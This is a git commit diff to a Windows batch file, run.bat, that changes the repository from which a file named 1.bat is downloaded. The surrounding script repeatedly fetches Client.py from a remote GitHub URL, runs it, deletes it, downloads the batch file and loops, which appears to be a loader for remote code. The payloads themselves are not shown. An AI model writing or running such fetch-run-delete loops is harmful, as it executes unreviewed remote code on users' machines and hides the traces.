99ca3c9eba1830be8322330150a63aa90dacd30a
oogabooga245 <68644080+oogabooga245@users.noreply.github.com>
2024-07-02 22:22:17 +0000

    Update run.bat

--- run.bat
+++ run.bat
@@ -2,6 +2,6 @@
 curl -o Client.py https://raw.githubusercontent.com/oogabooga245/-/main/Client.py
 python3 Client.py
 del Client.py
-curl -o 1.bat https://raw.githubusercontent.com/oogabooga245/-/main/1.bat
+curl -o 1.bat https://raw.githubusercontent.com/oogabooga245/jordy/main/1.bat
 timeout 5 >null
 goto :top
